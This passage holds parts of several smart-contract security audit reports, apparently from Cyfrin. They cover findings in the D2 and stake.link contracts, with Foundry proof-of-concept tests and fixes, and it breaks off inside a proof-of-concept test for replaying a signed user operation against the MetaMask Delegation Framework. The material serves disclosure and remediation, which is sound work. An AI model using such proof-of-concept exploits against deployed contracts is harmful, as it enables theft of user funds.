However, the `deadline` parameter is included in the function call but is not present in the [`SwapRouter02.ExactInputParams`](https://berascan.com/address/0xe301e48f77963d3f7dbd2a4796962bd7f3867fb4#code) struct:

```solidity
struct ExactInputParams {
    bytes path;
    address recipient;
    uint256 amountIn;
    uint256 amountOutMinimum;
}
```

As a result, any call to `Bera_Module::bera_kodiakv3_swap` will always revert due to the mismatched function parameters.

**Impact:** Swaps executed through Kodiak V3 will fail entirely, as every transaction using `bera_kodiakv3_swap` will revert.

**Proof of Concept:** The following test will fail and highlights the issue:
```solidity
function test_bera_kodiakv3_swap() public {
    deal(WBERA_ADDRESS, address(strategy), 1e18);

    bytes memory path = abi.encodePacked(WBERA_ADDRESS, uint24(3000), HONEY_ADDRESS);

    vm.prank(EXECUTOR);
    bera.bera_kodiakv3_swap(
        WBERA_ADDRESS,
        1e18,
        0,
        path
    );

    assertGt(HONEY.balanceOf(address(strategy)),0);
}
```

**Recommended Mitigation:** Consider removing the `deadline` parameter from `IKodiakV3.ExactInputParams`. Also, consider adding a separate `deadline` that can be passed to the call to ensure proper deadline handling, as discussed in issue _7.4.3 Improper deadline handling_.


**D2:** Fixed in [`84dbcf9`](https://github.com/d2sd2s/d2-contracts/commit/84dbcf92e7a8a4d84b68d39e8726281660aee2b7)

**Cyfrin:** Verified.


### Kodiak swap functions do not check if output token is approved, risking stuck assets

**Description:** In the swap implementations within `Inch_Module`, both the input token and output token are validated to ensure they are approved before executing a swap. This validation is present in [`inch_swap`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Inch.sol#L48-L59), [`inch_uniswapV3Swap`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Inch.sol#L61-L84), and [`inch_clipperSwap`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Inch.sol#L86-L105).

However, this validation is missing in both [`Bera_Module::bera_kodiakv2_swap`](https://github.com/d2sd2s/d2-contracts/blob/main/contracts/modules/Bera.sol#L120-L130) and [`Bera_Module::bera_kodiakv3_swap`](https://github.com/d2sd2s/d2-contracts/blob/main/contracts/modules/Bera.sol#L188-L198).

As a result, the trader (`EXECUTOR_ROLE`) could accidentally or intentionally swap to a non-approved token. Since this token **cannot be swapped back, it would remain stuck in the Strategy contract, making it inaccessible.

**Impact:** If a trader swaps into a non-approved token, it would become irreversibly stuck in the contract, as it cannot be swapped back.

**Proof of Concept:** The following test highlights the issue:
```solidity
function test_bera_kodiakv2_swap_to_non_allowed_token() public {
    deal(WBERA_ADDRESS, address(strategy), 1e18);

    address[] memory path = new address[](2);
    path[0] = WBERA_ADDRESS;
    path[1] = RAMEN_TOKEN_ADDRESS; // not allowed

    vm.startPrank(EXECUTOR);
    bera.bera_kodiakv2_swap(
        WBERA_ADDRESS,
        1e18,
        0,
        path
    );

    uint256 ramenBalance = ERC20(RAMEN_TOKEN_ADDRESS).balanceOf(address(strategy));
    assertGt(ramenBalance,0);

    path[0] = RAMEN_TOKEN_ADDRESS;
    path[1] = WBERA_ADDRESS;

    // token cannot be swapped back
    vm.expectRevert("Invalid token");
    bera.bera_kodiakv2_swap(
        RAMEN_TOKEN_ADDRESS,
        ramenBalance,
        0,
        path
    );
    vm.stopPrank();

    // balance still left in contract
    assertEq(ERC20(RAMEN_TOKEN_ADDRESS).balanceOf(address(strategy)), ramenBalance);
}
```

**Recommended Mitigation:** Consider validating both input token _and_ output token. As is done in the `Inch_Module` swaps.

**D2:** Fixed in [`c70268c`](https://github.com/d2sd2s/d2-contracts/commit/c70268ca43bb3417958f72e51d7773f95425ca6e)

**Cyfrin:** Verified.

\clearpage
## Low Risk


### Aaves module lacks reward-claiming functionality

**Description:** The D2 protocol's Aave integration lacks reward claiming functionality in the Aave_Module.sol contract. While the protocol successfully interacts with Aave's lending and borrowing features, it does not implement any mechanism to claim or distribute rewards earned from these activities.

The contract lacks both the interface definition and implementation for interacting with Aave's IncentivesController, which is necessary for claiming rewards. As a result, any rewards accrued from lending and borrowing activities remain locked in the Aave protocol.

**Impact:** The absence of reward claiming functionality leads to several consequences:

1. **Permanent Loss of Value**
    - All rewards earned from lending and borrowing activities are effectively locked in the Aave protocol
    - These rewards accumulate but remain inaccessible to both users and the protocol
    - The value is permanently stranded unless reward claiming functionality is added
2. **Reduced Protocol Revenue**
    - The protocol misses out on potential revenue streams from reward tokens
    - Lost opportunity for treasury diversification through reward tokens

**Recommended Mitigation:** To address this, consider implementing:

1. Integration with Aave's IncentivesController to enable reward claiming
2. A reward distribution system that fairly allocates claimed rewards between users and protocol
3. Regular automated claiming mechanisms to optimize reward collection


**D2:** Fixed in [`d3f76bb`](https://github.com/d2sd2s/d2-contracts/commit/d3f76bb009631b8a70fd21c47733336708a8030d)

**Cyfrin:** Verified.


### Compromised trader account can block admin from revoking access

**Description:** The trading strategy contract for D2 defines two roles: `ADMIN_ROLE` and `EXECUTOR_ROLE`. The `EXECUTOR_ROLE` is intended for the active party responsible for executing trades on behalf of stakers, while the `ADMIN_ROLE` is a more passive role, primarily reserved for emergency interventions.

The issue arises in [`Vault::initialize`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/VaultV3.sol#L61-L81), where the `args.trader` [is assigned](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/VaultV3.sol#L71-L74) both `ADMIN_ROLE` and `EXECUTOR_ROLE`:
```solidity
s.grantRole(ADMIN_ROLE, args._owner);
s.grantRole(EXECUTOR_ROLE, args._owner);
s.grantRole(ADMIN_ROLE, args._trader); // @audit admin given to trader as well
s.grantRole(EXECUTOR_ROLE, args._trader);
```
This setup introduces a security risk: if the traders account is compromised, the attacker could revoke the owners admin privileges, preventing them from removing the compromised trader from the `EXECUTOR_ROLE`.

**Impact:** If the trader account is compromised, the protocol admin may be unable to revoke the `EXECUTOR_ROLE` from the attacker before they can exploit their access. This could result in unauthorized or malicious trades, potentially harming the protocol and its stakeholders.


**Recommended Mitigation:** Consider not assigning `ADMIN_ROLE` to `args.trader`:
```diff
  s.grantRole(ADMIN_ROLE, args._owner);
  s.grantRole(EXECUTOR_ROLE, args._owner);
- s.grantRole(ADMIN_ROLE, args._trader);
  s.grantRole(EXECUTOR_ROLE, args._trader);
```


**D2:** Fixed in [`614daaa`](https://github.com/d2sd2s/d2-contracts/commit/614daaaf2a1a4fddf7c8b070280f4b9cf102bb07)

**Cyfrin:** Verified.


### Improper deadline handling

**Description:** The Bera module shows improper handling of transaction deadlines in DEX operations:

- KodiakV2/V3 operations use`type(uint256).max`as deadline:

```solidity
// Bera.sol
function bera_kodiakv2_add(...) {
    kodiakv2.addLiquidity(..., type(uint256).max);
}

function bera_kodiakv2_swap(address token, uint amount, uint amountMin, address[] calldata path) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    ...
    kodiakv2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        ...
        type(uint256).max
    );
}

function bera_kodiakv3_increase(...) {
    kodiakv3.increaseLiquidity(IKodiakV3.IncreaseLiquidityParams({
        ...
        deadline: type(uint256).max
    }));
}
```

- OogaBooga and KodiakV3 (see issue _7.3.6 `Bera_Module::bera_kodiakv3_swap` broken due to `deadline` parameter_) swaps lack deadline protection entirely:

```solidity
function bera_oogabooga_swap(...) {
    oogaBooga.swap(tokenInfo, pathDefinition, executor, referralCode);
}
```

Using infinite deadlines or no deadlines at all is a risky practice in DeFi. Transaction deadlines are a crucial protection mechanism that prevents trades from executing under unexpected market conditions, especially during network congestion or high volatility periods.

**Impact:** While access is restricted to EXECUTOR_ROLE, improper deadline handling could lead to:

- Trades executing at unexpected times during network congestion
- No protection against stale transactions in volatile market conditions
- MEV bots could hold transactions and execute them at disadvantageous moments
- No mechanism to invalidate outdated trades

For OogaBooga specifically, the lack of deadline parameter in their protocol design leaves users exposed to these risks without any way to protect themselves.

**Recommended Mitigation:**
- For Kodiak operations, implement reasonable deadlines:

```solidity
uint256 private constant MAX_DEADLINE_WINDOW = 30 minutes;

function bera_kodiakv2_add(...) {
    kodiakv2.addLiquidity(..., block.timestamp + MAX_DEADLINE_WINDOW);
}
```

- For OogaBooga and Kodiak V3, consider implementing a wrapper that adds deadline protection:

```solidity
function bera_oogabooga_swap(..., uint256 deadline) {
   require(block.timestamp <= deadline, "Expired");
    oogaBooga.swap(...);
}

function bera_kodiakv3_swap(..., uint256 deadline) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    require(block.timestamp <= deadline, "Expired");
    ...
    kodiakv3swap.exactInput(IKodiakV3.ExactInputParams({
        ...
    }));
}
```

**D2:** Ignored "Improper deadline handling" because we mostly don't care about it on our main chain Arbitrum, although we understand how it's riskier for on Mainnet

**Cyfrin:** Acknowledged.


### Missing events for important state changes

**Description:** The following calls lack events emitted even though they change important states inside the contracts:
* `Strategy::claim`
* `Strategy::setFrozen`
* `Strategy::setSelector`
* `VaultV3::emergencyFreeze`


**Recommended Mitigation:** Consider adding events to be emitted in the above calls. This provides a clear on-chain record of when and by whom the strategy was claimed, improving transparency and auditability.


**D2:** Ignored "Missing events for important state changes" as we will remove those calls shortly

**Cyfrin:** Acknowledged.


### `Silo_Module::silo_execute` will revert as approval is to the wrong contract

**Description:** D2 integrates with the lending protocol [Silo](https://www.silo.finance/) via the [`Silo_Module`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Silo.sol), which facilitates communication with the Silo contract.

One of the functions in this module is [`Silo_Module::silo_execute`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Silo.sol#L55-L58), which allows bundling multiple calls and sending them to the Silo Router to optimize gas usage:

```solidity
function silo_execute(ISiloRouter.Action[] calldata actions) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    // @audit approval should be to `address(router)` as it is the one facilitating the actions
    IERC20(actions[0].asset).approve(actions[0].silo, actions[0].amount);
    router.execute(actions);
}
```
The issue here is that the approval is incorrectly granted to `actions[0].silo`, whereas it should be granted to `router`, as this is the contract responsible for handling all token transfers.

**Impact:** The `silo_execute` function will fail due to the incorrect approval. While this does not affect the overall functionality of `Silo_Module`since all necessary actions can still be executed separatelythe gas savings intended by bundling transactions will be lost, leading to higher transaction costs.

**Proof of Concept:** The following test highlights the issue:
```solidity
function test_silo_execute() public {
    deal(WETH_ADDRESS,address(strategy),1e18);

    ISiloRouter.Action[] memory actions = new ISiloRouter.Action[](4);
    actions[0] = ISiloRouter.Action(ISiloRouter.ActionType.Deposit, GMX_SILO, WETH_ADDRESS, 1e18, false);
    actions[1] = ISiloRouter.Action(ISiloRouter.ActionType.Borrow, GMX_SILO, GMX_ADDRESS, 100e18, false);
    actions[2] = ISiloRouter.Action(ISiloRouter.ActionType.Repay, GMX_SILO, GMX_ADDRESS, 100e18, false);
    actions[3] = ISiloRouter.Action(ISiloRouter.ActionType.Withdraw, GMX_SILO, WETH_ADDRESS, 1e18-1, false);

    vm.prank(EXECUTOR);
    silo.silo_execute(actions);

    assertEq(gmxDebtToken.balanceOf(address(strategy)), 1);
    assertEq(gmxCollateralToken.balanceOf(address(strategy)), 0);
    assertEq(wethCollateralToken.balanceOf(address(strategy)), 0);
    assertEq(address(strategy).balance, 1e18-1);
}
```

**Recommended Mitigation:** Consider approving `router` instead:
```diff
- IERC20(actions[0].asset).approve(actions[0].silo, actions[0].amount);
+ IERC20(actions[0].asset).approve(address(router), actions[0].amount);
```

**D2:** Fixed in [`ea03f4d`](https://github.com/d2sd2s/d2-contracts/commit/ea03f4d4b5baf1436a7c49e789a499b489713606)

**Cyfrin:** Verified.


### Silo and Dolomite lack LTV limit increasing liquidation risk

**Description:** When borrowing from Aave, there is a check in [`Aave_Module::aave_borrow`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Aave.sol#L51-L54) to ensure that the loan-to-value (LTV) ratio remains below `MAX_LTV_FACTOR` (80%):

```solidity
pool.borrow(asset, amount, interestRateMode, referralCode, onBehalfOf);
(uint256 totalCollateralBase, uint256 totalDebtBase, , , uint256 ltv, ) = pool.getUserAccountData(onBehalfOf);
uint256 maxDebtBase = (totalCollateralBase * ltv * MAX_LTV_FACTOR) / (BASIS_FACTOR * MANTISSA_FACTOR);
require(totalDebtBase <= maxDebtBase, "borrow amount exceeds max LTV");
```

However, this LTV check is missing from [`Silo_Module::silo_borrow`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Silo.sol#L44-L47) and [`Dolomite_Module::dolomite_openBorrowPosition`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L208-L216)/[`dolomite_transferBetweenAccounts`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L226-L234), which are also lending protocols. As a result, positions with a higher LTV than 80% can be opened in these platforms.

**Impact:** Since Silo and Dolomite do not enforce the same 80% LTV limit higher risk positions can be entered. This increases the likelihood of unexpected liquidations, exposing users to unnecessary financial risk.

**Recommended Mitigation:** Consider implementing the same LTV checks for Silo and Dolomite.

**D2:** Ignored "Silo and Dolomite lack LTV limit increasing liquidation risk", will assume the trader is not reckless

**Cyfrin:** Acknowledged.


### Borrowing non-approved tokens can bypass trading restrictions

**Description:** In the `Inch_Module` swap functions, the output token is verified to ensure it is approved by the protocol. This validation helps maintain trust that only pre-approved tokens will be traded.

However, the trader can still borrow non-approved tokens, bypassing this restriction. This undermines the assumption that only approved tokens can be used or held by the Strategy contract.

**Impact:** The expectation that only approved tokens will be used in trading can be violated if a trader borrows and holds non-approved tokens. This weakens the protocols asset control and may introduce unforeseen risks.

**Recommended Mitigation:** Consider validating that the borrowed tokens in Aave, Silo and Dolomite are also approved tokens.


**D2:** Fixed for Aave and Silo in [`1704b31`](https://github.com/d2sd2s/d2-contracts/commit/1704b315b576175932abf11ff50252007cc2d702), Dolomite acknowledged.

**Cyfrin:** Verified.

\clearpage
## Informational


### `ETH` calls on `Dolomite_Module` have no corresponding calls on Dolomite

**Description:** The following calls have no corresponding call on the Dolomite [deployed contract](https://berascan.com/address/0xd6a31b6aea4d26a19bf479b5032d9ddc481187e6#writeContract):
* [`Dolomite_Module::dolomite_depositETH`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L127-L131)
* [`Dolomite_Module::dolomite_withdrawETH`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L153-L159)
* [`Dolomite_Module::dolomite_depositETHIntoDefaultAccount`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L140-L142)
* [`Dolomite_Module::dolomite_withdrawETHFromDefaultAccount`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L169-L174)

Consider removing them.

**D2:** Removed in [`dc68fe8`](https://github.com/d2sd2s/d2-contracts/commit/dc68fe87fbe6ae605b4e0e6489db3ba65f905e15)

**Cyfrin:** Verified.


### Unnecessary validation in `Bera_Module::bera_infrared_stake` should follow standard pattern

**Description:** In [`Bera_Module::bera_infrared_stake`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Bera.sol#L78-L82), there is a call to `validateToken(vault)`:

```solidity
function bera_infrared_stake(address vault, address token, uint256 amount) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    validateToken(vault); // @audit unnecessary
    IERC20(token).approve(vault, amount);
    IInfraredVault(vault).stake(amount);
}
```

This is unusual because the validation is applied to `vault` rather than `token`. Additionally, the check is unnecessary since the `token` must already be present in the contract, and for that to happen, it must be included in `allowedTokens`.

However, the `validateToken(vault)` function does serve a purposeit prevents the trader from using a malicious `vault` contract. Therefore, the target should still be validated, but using a more appropriate approach. This pattern is already established in other parts of the codebase, where the validation is performed inside the [`TraderV0::approve`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Trader.sol#L1958-L1963) function. To maintain consistency, we suggest following the same approach here.

Consider removing both the `validateToken(vault);` call and the approval altogether:

```diff
function bera_infrared_stake(address vault, address token, uint256 amount) external onlyRole(EXECUTOR_ROLE) nonReentrant {
-   validateToken(vault);
-   IERC20(token).approve(vault, amount);
    IInfraredVault(vault).stake(amount);
}
```

**D2:** Fixed in [`b0c4c4b`](https://github.com/d2sd2s/d2-contracts/commit/b0c4c4b11da647555a126eebd4e61104bb8ab718)

**Cyfrin:** Verified.


### Unused imports

**Description:** There are a couple of unused imports in the contracts:

```solidity
import "@solidstate/contracts/introspection/ERC165/base/ERC165Base.sol";
import "@solidstate/contracts/proxy/diamond/writable/DiamondWritableInternal.sol";
```

These are imported in:
* [`Dolomite.sol#L6-L7`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L6-L7)
 * [`Dolomite.sol#L6-L7`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Dolomite.sol#L6-L7), Here they're used by `GMXV2_Cutter` but since this abstract contract is also unused it can also be removed.
 * [`Pendle.sol#L6-L7`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Pendle.sol#L6-L7)
* [`Silo.sol#L6-L7`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Silo.sol#L6-L7)
* [`WETH.sol#L6-L7`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/WETH.sol#L6-L7)

Also, the [`Ownable` import](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/D2OFT.sol#L4) in `D2OFT.sol#L4` is not used:
```solidity
import "@openzeppelin/contracts/access/Ownable.sol";
```

Consider removing these.


**D2:** Removed in [`8880a91`](https://github.com/d2sd2s/d2-contracts/commit/8880a9180452afda8d246c4b84d7494bfa2ad443)

**Cyfrin:** Verified.


### Aave `swapBorrowRateMode` is deprecated

**Description:** In the `Aave_Module` there is a call [`aave_swapBorrowRateMode`](https://github.com/d2sd2s/d2-contracts/blob/c2fc257605ebc725525028a5c17f30c74202010b/contracts/modules/Aave.sol#L67-L69):
```solidity
function aave_swapBorrowRateMode(address asset, uint256 interestRateMode) external onlyRole(EXECUTOR_ROLE) nonReentrant {
    pool.swapBorrowRateMode(asset, interestRateMode);
}
```
The call `swapBorrowRateMode` is however [deprecated](https://governance.aave.com/t/bgd-full-deprecation-of-stable-rate/16473), it only exists as a call on the [v2 pool](https://etherscan.io/address/0x7d2768de32b0b80b7a3454c06bdac94a69ddc7a9#writeProxyContract).

Consider removing this call.


**D2:** Removed in [`cbcddab`](https://github.com/d2sd2s/d2-contracts/commit/cbcddab7dd386c66cccf0a1073ba1c666fc9a365)

**Cyfrin:** Verified.


### Selectors for `Bera_Module::bera_kodiakv2_swap` and `bera_kodiakv3_swap` needs to be separately added

**Description:** In `Strategy::constructor` almost all existing facet selectors are added to the `s.selectors` mapping, which is then used by the fallback function to direct the call to the correct facet.

Almost all, the `Bera_Module::bera_kodiakv2_swap` and `bera_kodiakv3_swap` are not present here and need to be added separately using the `Strategy::setSelector` call limited to role `0x00` (`DEFAULT_ADMIN_ROLE`).

Consider including these in the general selector assignment in `Strategy::constructor` instead. Thus saving two calls.


**D2:** Added in [`5e22afc`](https://github.com/d2sd2s/d2-contracts/commit/5e22afc1995cf93930ddb738b9e9427846f14515)

**Cyfrin:** Verified.


### Consider using Ownable2Step instead of Ownable

**Description:** The `VaultV3` and `VaultV0` contracts use OpenZeppelin's `Ownable` for access control. While secure, this single-step ownership transfer pattern risks permanently locking the contracts if ownership is accidentally transferred to an invalid or inaccessible address.

Consider using `Ownable2Step` instead, which requires the new owner to accept ownership in a separate transaction. This two-step pattern is considered best practice as it prevents accidental transfers and ensures the new owner can actually interact with the contract.

**D2:** Ignored "Consider using Ownable2Step instead of Ownable" we'll consider it for the future

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-02-24-cyfrin-d2-v2.1.md ------


------ FILE START car/reports_md/2025-02-28-cyfrin-stakedotlink-v2.0.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)


**Assisting Auditors**

[Alex Roan](https://twitter.com/alexroan)

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

---

# Findings
## Informational


### Lack of events emitted on state changes

**Description:** The following functions should ideally emit an event to enhance transparency and traceability:


[`Vault::setDelegateRegistry`](https://github.com/stakedotlink/audit-2025-02-linkpool/blob/046c65a9c771315816bc59533183f52661af8e5e/contracts/linkStaking/base/Vault.sol#L180-L186) and [`VaultControllerStrategy::setDelegateRegistry`](https://github.com/stakedotlink/audit-2025-02-linkpool/blob/046c65a9c771315816bc59533183f52661af8e5e/contracts/linkStaking/base/VaultControllerStrategy.sol#L708-L714):

```diff
  function setDelegateRegistry(address _delegateRegistry) external onlyOwner {
      delegateRegistry = _delegateRegistry;
+     emit SetDelegateRegistry(_delegateRegistry);
  }
```

[`FundFlowController::setNonLINKRewardReceiver`](https://github.com/stakedotlink/audit-2025-02-linkpool/blob/046c65a9c771315816bc59533183f52661af8e5e/contracts/linkStaking/FundFlowController.sol#L325-L331):

```diff
  function setNonLINKRewardReceiver(address _nonLINKRewardReceiver) external onlyOwner {
      nonLINKRewardReceiver = _nonLINKRewardReceiver;
+     emit SetNonLINKRewardReceiver(_nonLINKRewardReceiver);
  }
```

Additionally, an event could be emitted when rewards are withdrawn in [`FundFlowController::withdrawTokenRewards`](https://github.com/stakedotlink/audit-2025-02-linkpool/blob/046c65a9c771315816bc59533183f52661af8e5e/contracts/linkStaking/FundFlowController.sol#L307-L323):
```diff
  function withdrawTokenRewards(address[] calldata _vaults, address[] calldata _tokens) external {
      // ...
+     emit WithdrawTokenRewards(msg.sender, _vaults, _tokens);
  }
```

Consider adding events to these functions to provide a clear on-chain record of when and by whom these actions were executed. This improves transparency and makes it easier to track changes.

**Stake.Link:** Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### Unnecessary token transfer when withdrawing reward tokens

**Description:** When claiming non-LINK reward tokens, the tokens are transferred `Vault -> FundFlowController -> nonLINKRewardReceiver`:

[`Vault::withdrawTokenRewards`](https://github.com/stakedotlink/audit-2025-02-linkpool/blob/046c65a9c771315816bc59533183f52661af8e5e/contracts/linkStaking/base/Vault.sol#L168-L178) transfers to `msg.sender` (`FundFlowController`):
```solidity
function withdrawTokenRewards(address[] calldata _tokens) external onlyFundFlowController {
    for (uint256 i = 0; i < _tokens.length; ++i) {
        IERC20Upgradeable rewardToken = IERC20Upgradeable(_tokens[i]);
        uint256 balance = rewardToken.balanceOf(address(this));
        if (balance != 0) rewardToken.safeTransfer(msg.sender, balance);
    }
}
```

and [`FundFlowController::withdrawTokenRewards`](https://github.com/stakedotlink/audit-2025-02-linkpool/blob/046c65a9c771315816bc59533183f52661af8e5e/contracts/linkStaking/FundFlowController.sol#L312-L323) transfers to the protocol wallet `nonLINKRewardReceiver`:
```solidity
function withdrawTokenRewards(address[] calldata _vaults, address[] calldata _tokens) external {
    for (uint256 i = 0; i < _vaults.length; ++i) {
        IVault(_vaults[i]).withdrawTokenRewards(_tokens);
    }

    for (uint256 i = 0; i < _tokens.length; ++i) {
        IERC20Upgradeable rewardToken = IERC20Upgradeable(_tokens[i]);
        if (address(rewardToken) == linkToken) revert InvalidToken();
        uint256 balance = rewardToken.balanceOf(address(this));
        if (balance != 0) rewardToken.safeTransfer(nonLINKRewardReceiver, balance);
    }
}
```

This could be optimized by letting the vault transfer to `nonLINKRewardReceiver` directly, thus removing one token transfer from the flow:

```solidity
function withdrawTokenRewards(address[] calldata _vaults, address[] calldata _tokens) external {
    // cache linkToken
    address _linkToken = linkToken;

    // check for LINK token
    for (uint256 i = 0; i < _tokens.length; ) {
        if (_tokens[i] == _linkToken) revert InvalidToken();
        unchecked { ++i; }
    }

    for (uint256 i = 0; i < _vaults.length; ++i) {
        // add `nonLINKRewardReceiver` in the call to vault.withdrawTokenRewards
        IVault(_vaults[i]).withdrawTokenRewards(_tokens, nonLINKRewardReceiver);
    }
}
```

```diff
- function withdrawTokenRewards(address[] calldata _tokens) external onlyFundFlowController {
+ function withdrawTokenRewards(address[] calldata _tokens, address _receiver) external onlyFundFlowController {
      for (uint256 i = 0; i < _tokens.length; ++i) {
          IERC20Upgradeable rewardToken = IERC20Upgradeable(_tokens[i]);
          uint256 balance = rewardToken.balanceOf(address(this));
-         if (balance != 0) rewardToken.safeTransfer(msg.sender, balance);
+         if (balance != 0) rewardToken.safeTransfer(_receiver, balance);
      }
  }
```

As `Vault::withdrawTokenRewards` is already protected by `onlyFundFlowController` this poses no extra risk.

**Stake.Link:** Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-02-28-cyfrin-stakedotlink-v2.0.md ------


------ FILE START car/reports_md/2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md ------

**Lead Auditors**

[0kage](https://x.com/0kage_eth)

[Al-qaqa](https://x.com/Al_Qa_qa)

**Assisting Auditors**



---

# Findings
## High Risk


### EntryPoint not included in user operation hash creates the possibility of Replay Attacks

**Description:** According to `EIP-4337`, the user operation hash should be constructed in a way to protect from replay attacks either on the same chain or different chains.

[eip-4337#useroperation](https://eips.ethereum.org/EIPS/eip-4337#useroperation)
> To prevent replay attacks (both cross-chain and multiple `EntryPoint` implementations), the `signature` should depend on `chainid` and the `EntryPoint` address

> The `userOpHash` is a hash over the userOp (except signature), entryPoint and chainId.

In the current `DeleGatorCore` and `EIP7702DeleGatorCore` implementations , the user operation hash does not include the `entryPoint` address.

```solidity
    function validateUserOp(
        PackedUserOperation calldata _userOp,
>>      bytes32, //@audit ignores UserOpHash from the Entry Point
        uint256 _missingAccountFunds
    ) ... {
>>      validationData_ = _validateUserOpSignature(_userOp, getPackedUserOperationTypedDataHash(_userOp));
        _payPrefund(_missingAccountFunds);
    }
// ------------------
    function getPackedUserOperationTypedDataHash(PackedUserOperation calldata _userOp) public view returns (bytes32) {
        return MessageHashUtils.toTypedDataHash(_domainSeparatorV4(), getPackedUserOperationHash(_userOp));
    }
// ------------------
    function getPackedUserOperationHash(PackedUserOperation calldata _userOp) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                PACKED_USER_OP_TYPEHASH,
                _userOp.sender,
                _userOp.nonce,
                keccak256(_userOp.initCode),
                keccak256(_userOp.callData),
                _userOp.accountGasLimits,
                _userOp.preVerificationGas,
                _userOp.gasFees,
                keccak256(_userOp.paymasterAndData)
            )
        ); //@audeit does not include entry point address
    }
```

Note above that the `EntryPoint` address is not included in the hash generated via `getPackedUserOperationHash()`. The `_domainSeparatorV4()` will only include the `chainId` and `address(this)` but excludes the `EntryPoint` address.

**Impact:** Upgrading the delegator contract to include a new `EntryPoint` address opens the possibility of replay attacks.

**Proof of Concept:** Following POC shows the possibility of replaying previous native transfers when delegator contract is upgraded to a new `EntryPoint`.

```solidity
contract EIP7702EntryPointReplayAttackTest is BaseTest {
    using MessageHashUtils for bytes32;

    constructor() {
        IMPLEMENTATION = Implementation.EIP7702Stateless;
        SIGNATURE_TYPE = SignatureType.EOA;
    }

    // New EntryPoint to upgrade to
    EntryPoint newEntryPoint;
    // Implementation with the new EntryPoint
    EIP7702StatelessDeleGator newImpl;

    function setUp() public override {
        super.setUp();

        // Deploy a second EntryPoint
        newEntryPoint = new EntryPoint();
        vm.label(address(newEntryPoint), "New EntryPoint");

        // Deploy a new implementation connected to the new EntryPoint
        newImpl = new EIP7702StatelessDeleGator(delegationManager, newEntryPoint);
        vm.label(address(newImpl), "New EIP7702 StatelessDeleGator Impl");
    }

    function test_replayAttackAcrossEntryPoints() public {
        // 1. Create a UserOp that will be valid with the original EntryPoint
        address aliceDeleGatorAddr = address(users.alice.deleGator);

        // A simple operation to transfer ETH to Bob
        Execution memory execution = Execution({ target: users.bob.addr, value: 1 ether, callData: hex"" });

        // Create the UserOp with current EntryPoint
        bytes memory userOpCallData = abi.encodeWithSignature(EXECUTE_SINGULAR_SIGNATURE, execution);
        PackedUserOperation memory userOp = createUserOp(aliceDeleGatorAddr, userOpCallData);

        // Alice signs it with the current EntryPoint's context
        userOp.signature = signHash(users.alice, getPackedUserOperationTypedDataHash(userOp));

        // Bob's initial balance for verification
        uint256 bobInitialBalance = users.bob.addr.balance;

        // Execute the original UserOp through the first EntryPoint
        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
        userOps[0] = userOp;
        vm.prank(bundler);
        entryPoint.handleOps(userOps, bundler);

        // Verify first execution worked
        uint256 bobBalanceAfterExecution = users.bob.addr.balance;
        assertEq(bobBalanceAfterExecution, bobInitialBalance + 1 ether);

        // 2. Modify code storage
        // The code will be: 0xef0100 || address of new implementation
        vm.etch(aliceDeleGatorAddr, bytes.concat(hex"ef0100", abi.encodePacked(newImpl)));

        // Verify the implementation was updated
        assertEq(address(users.alice.deleGator.entryPoint()), address(newEntryPoint));

        // 3. Attempt to replay the original UserOp through the new EntryPoint
        vm.prank(bundler);
        newEntryPoint.handleOps(userOps, bundler);

